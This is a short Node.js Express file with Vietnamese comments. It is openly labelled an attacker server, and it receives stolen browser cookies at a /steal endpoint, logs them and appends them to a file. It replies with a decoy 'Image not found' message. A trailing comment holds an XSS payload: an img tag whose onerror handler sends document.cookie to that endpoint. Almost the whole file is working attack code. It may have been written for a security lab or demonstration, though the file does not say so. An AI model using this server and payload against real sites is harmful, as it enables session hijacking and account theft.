const express = require('express');
const app = express();
const PORT = 3001;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Endpoint để nhận cookie bị đánh cắp
app.get('/steal', (req, res) => {
    const cookie = req.query.cookie;
    console.log('Stolen Cookie:', cookie);
    
    // Lưu cookie vào file
    const fs = require('fs');
    fs.appendFileSync('stolen-cookies.txt', `Cookie stolen at ${new Date().toISOString()}: ${cookie}\n`);
    
    // Trả về một response vô hại
    res.send('Image not found');
});

app.listen(PORT, () => {
    console.log(`Attacker server running on port ${PORT}\n`);
}); 

// <img src="x" onerror="if(!window.stolen){new 
// Image().src='http://localhost:3001/steal?cookie='+document.cookie;window.stolen=1}">
